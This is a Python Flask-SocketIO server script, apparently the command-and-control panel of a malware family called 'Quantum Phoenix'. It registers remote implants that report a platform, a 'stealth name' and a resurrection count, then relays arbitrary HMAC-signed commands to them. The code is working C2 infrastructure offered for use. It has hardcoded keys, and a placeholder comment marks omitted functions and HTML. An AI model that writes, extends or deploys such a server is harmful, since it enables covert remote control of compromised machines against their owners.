#!/usr/bin/env python3
from flask import Flask, render_template_string, request
from flask_socketio import SocketIO
import hashlib, hmac, json, time, subprocess, os
from datetime import datetime

app = Flask(__name__)
app.config['SECRET_KEY'] = 'quantum_phoenix_server_2024'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Phoenix registry and command history
PHOENIX_REGISTRY = {}
COMMAND_HISTORY = []
COMMAND_KEY = "quantum_phoenix_master_key_2024"

def sign_command(command):
    """Sign commands with HMAC-SHA256"""
    return hmac.new(
        COMMAND_KEY.encode(), 
        command.encode(), 
        hashlib.sha256
    ).hexdigest()

# ... (keep all your existing functions and HTML the same) ...

@app.route('/')
def quantum_control():
    return render_template_string(HTML)

@app.route('/health')
def health_check():
    """Health check endpoint for Railway"""
    return {
        'status': 'ok', 
        'service': 'Quantum Phoenix Server V4',
        'active_phoenixes': len(PHOENIX_REGISTRY),
        'timestamp': datetime.now().isoformat()
    }

@socketio.on('quantum_command')
def handle_quantum_command(data):
    """Handle signed quantum commands"""
    phoenix_id = data.get('id')
    command = data.get('c')
    signature = data.get('sig', '')
    
    if phoenix_id in PHOENIX_REGISTRY:
        # Log command
        COMMAND_HISTORY.append({
            'timestamp': datetime.now().isoformat(),
            'phoenix_id': phoenix_id,
            'command': command,
            'signature': signature
        })
        
        # Send signed command to phoenix
        signed_command = {
            'c': command,
            'sig': sign_command(command)  # Add HMAC signature
        }
        socketio.emit('quantum_command', signed_command, room=PHOENIX_REGISTRY[phoenix_id])
        print(f"📤 Command sent to {phoenix_id}: {command}")

@socketio.on('connect')
def handle_connect():
    print(f"🔗 New quantum connection: {request.sid}")

@socketio.on('disconnect')  
def handle_disconnect():
    for pid, sid in list(PHOENIX_REGISTRY.items()):
        if sid == request.sid: 
            del PHOENIX_REGISTRY[pid]
            print(f"🔌 Phoenix disconnected: {pid}")
            # Broadcast to all clients that phoenix disconnected
            socketio.emit('phoenix_disconnected', {'id': pid})

@socketio.on('phoenix_quantum')
def handle_phoenix_quantum(data):
    """Register new phoenix connection"""
    phoenix_id = data.get('id')
    PHOENIX_REGISTRY[phoenix_id] = request.sid
    
    print(f"🔥 PHOENIX REGISTERED: {phoenix_id}")
    print(f"   Platform: {data.get('platform', 'unknown')}")
    print(f"   Resurrections: {data.get('r', 0)}")
    print(f"   Safe Mode: {data.get('safe', False)}")
    print(f"   Stealth Name: {data.get('s', 'unknown')}")
    
    # Broadcast to ALL clients that a new phoenix connected
    socketio.emit('phoenix_quantum', data)
    print(f"📢 Broadcasted phoenix connection to all clients")

# FIX: Railway requires this to be named 'application'
application = app

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    print("🚀 QUANTUM PHOENIX SERVER V4 STARTED")
    print(f"📍 Access: http://localhost:{port}")
    print("🔐 Secure command channel active")
    print("🌐 Cross-platform support enabled")
    print("📊 Real-time monitoring ready")
    print(f"🏥 Health check: http://localhost:{port}/health")
    print("=" * 50)
    
    socketio.run(application, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)